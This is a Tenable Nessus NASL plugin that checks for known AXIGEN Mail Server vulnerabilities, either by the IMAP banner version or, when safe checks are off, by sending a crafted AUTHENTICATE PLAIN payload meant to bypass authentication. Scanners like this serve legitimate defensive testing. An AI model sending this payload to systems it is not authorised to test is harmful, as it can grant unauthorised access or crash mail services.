#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24321);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/05/19 17:45:33 $");

  script_cve_id("CVE-2007-0886", "CVE-2007-0887");
  script_bugtraq_id(22473, 22603);
  script_osvdb_id(33165, 38133);

  script_xref(name:"EDB-ID", value:"3289");
  script_xref(name:"EDB-ID", value:"3290");
  script_xref(name:"EDB-ID", value:"3329");

  script_name(english:"AXIGEN Mail Server < 2.0.0 Multiple Remote Vulnerabilities");
  script_summary(english:"Checks version of AXIGEN Mail Server");

  script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by multiple vulnerabilities." );
  script_set_attribute(attribute:"description", value:
"The remote host is running AXIGEN Mail Server, a messaging system for
Linux and BSD. 

The POP3 server component of AXIGEN Mail Server contains a format
string vulnerability because it calls syslog() when logtypeis set to
'system'.  In addition, the IMAP server component is affected by two
denial of service issues involving PLAIN and CRAM-MD5 authentication
methods.  An unauthenticated, remote attacker can leverage these issues
to crash the IMAP service and possibly execute arbitrary code
remotely." );
  script_set_attribute(attribute:"see_also", value:"http://www.axigen.com/forum/showthread.php?p=2386#post2386" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to AXIGEN Mail Server version 2.0.0 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

   script_set_attribute(attribute:"plugin_publication_date", value: "2007/02/09");
   script_set_attribute(attribute:"vuln_publication_date", value: "2007/02/08");
   script_set_attribute(attribute:"plugin_type", value:"remote");
   script_set_attribute(attribute:"cpe", value:"cpe:/a:gecad:axigen_mail_server");
   script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("imap_func.inc");
include("misc_func.inc");


# Check the imap server.
port = get_service(svc:"imap", default: 143, exit_on_fail: 1);
if ( get_kb_item("imap/"+port+"/false_imap")
  || get_kb_item("imap/"+port+"/overflow")) exit(0);

# Make sure it's AXIGEN.
banner = get_imap_banner(port:port);
if (!banner || " AXIGEN " >!< banner)
  exit(0, "The IMAP server on port "+port+" is not AXIGEN.");


# If safe checks are enabled...
if (safe_checks())
{
  if (egrep(pattern:" AXIGEN ([0-1]\..*|2\.0.0-beta1) ", string:banner))
  {
    report = string(
      "Nessus has determined the flaw exists with the application\n",
      "based only on the version in the IMAP server's banner.\n"
    );
    security_hole(port:port, extra:report);
  }
}
# Otherwise...
else
{
  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

    # Read banner.
    s = recv_line(socket:soc, length:1024);
    if (strlen(s))
    {
      # Start to log in.
      ++tag;
      c = string("nessus", string(tag), " AUTHENTICATE PLAIN");
      send(socket:soc, data:string(c, "\r\n"));
      s = recv_line(socket:soc, length:1024);
      if ("+ data" >< s)
      {
        # Send the exploit to see if we can bypass authentication.
        #
        # nb: this will likely cause existing connections to be dropped.
        c = base64(str:raw_string("*", 0));
        send(socket:soc, data:string(c, "\r\n"));
        s = recv_line(socket:soc, length:1024);

        # There's a problem if we were able to authenticate.
        if ("OK Done AUTHENTICATE" >< s) security_hole(port);
      }
      close(soc);
    }
}
